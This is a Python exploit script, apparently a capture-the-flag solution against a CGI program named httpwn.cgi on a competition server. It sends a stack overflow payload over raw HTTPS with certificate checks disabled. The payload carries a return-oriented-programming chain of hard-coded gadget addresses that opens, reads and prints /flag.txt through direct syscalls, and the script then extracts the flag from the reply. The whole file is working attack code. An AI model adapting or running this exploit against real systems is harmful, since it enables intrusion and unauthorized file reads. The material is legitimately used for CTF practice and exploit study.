#!/usr/bin/env python3
import socket, ssl, struct, re

def p64(x): return struct.pack("<Q", x)

HOST = "gzcli.techcomfest.1pc.tf"
PORT = 61555
CGI  = "/cgi-bin/httpwn.cgi"

# ---- Gadgets / addrs (from the provided static no-PIE build) ----
POP_RDI        = 0x401d80          # pop rdi ; ret
POP_RSI        = 0x40f772          # pop rsi ; ret
POP_RDX_RBX    = 0x469697          # pop rdx ; pop rbx ; ret
POP_RAX        = 0x438767          # pop rax ; ret
MOV_QWORD_RDI_RDX = 0x430813       # mov qword ptr [rdi], rdx ; ret
SYSCALL_RET    = 0x417ca2          # syscall ; ret

BSS            = 0x4a7270          # __bss_start (writable)
BUF            = BSS + 0x200       # scratch buffer

OFFSET_SAVED_RBP = 0x60            # from start of data[] to saved rbp

def rop_write_qword(addr, qword):
    return b"".join([
        p64(POP_RDI), p64(addr),
        p64(POP_RDX_RBX), p64(qword), p64(0),
        p64(MOV_QWORD_RDI_RDX),
    ])

def build_rop():
    rop = b""

    path = b"/flag.txt\x00"
    path += b"\x00" * ((8 - (len(path) % 8)) % 8)  # pad to 8

    # write "/flag.txt\0" into .bss
    for i in range(0, len(path), 8):
        rop += rop_write_qword(BSS + i, int.from_bytes(path[i:i+8], "little"))

    # open("/flag.txt", 0, 0)
    rop += b"".join([
        p64(POP_RDI), p64(BSS),
        p64(POP_RSI), p64(0),
        p64(POP_RDX_RBX), p64(0), p64(0),
        p64(POP_RAX), p64(2),          # __NR_open
        p64(SYSCALL_RET),
    ])

    # read(3, BUF, 0x100)
    rop += b"".join([
        p64(POP_RDI), p64(3),
        p64(POP_RSI), p64(BUF),
        p64(POP_RDX_RBX), p64(0x100), p64(0),
        p64(POP_RAX), p64(0),          # __NR_read
        p64(SYSCALL_RET),
    ])

    # write(1, BUF, 0x100)
    rop += b"".join([
        p64(POP_RDI), p64(1),
        p64(POP_RSI), p64(BUF),
        p64(POP_RDX_RBX), p64(0x100), p64(0),
        p64(POP_RAX), p64(1),          # __NR_write
        p64(SYSCALL_RET),
    ])

    # exit(0)
    rop += b"".join([
        p64(POP_RDI), p64(0),
        p64(POP_RAX), p64(60),         # __NR_exit
        p64(SYSCALL_RET),
    ])

    return rop

def build_payload():
    rop = build_rop()

    # Make strcpy harmless: data begins with "username=" then NUL
    prefix = b"username=" + b"\x00"

    pad = b"A" * (OFFSET_SAVED_RBP - len(prefix))
    saved_rbp = p64(0)

    return prefix + pad + saved_rbp + rop

def https_post_raw(host, port, path, body: bytes) -> bytes:
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
    ).encode() + body

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    with socket.create_connection((host, port)) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as s:
            s.sendall(req)
            chunks = []
            while True:
                d = s.recv(4096)
                if not d:
                    break
                chunks.append(d)
    return b"".join(chunks)

def main():
    payload = build_payload()
    resp = https_post_raw(HOST, PORT, CGI, payload)

    # split HTTP headers
    if b"\r\n\r\n" in resp:
        body = resp.split(b"\r\n\r\n", 1)[1]
    else:
        body = resp

    body_clean = body.replace(b"\x00", b"")
    text = body_clean.decode("utf-8", errors="ignore")

    # try to extract flag-ish token
    m = re.search(r"[A-Za-z0-9_]{2,}\{[^}\n]+\}", text)
    if m:
        print(m.group(0))
    else:
        print(text)

if __name__ == "__main__":
    main()
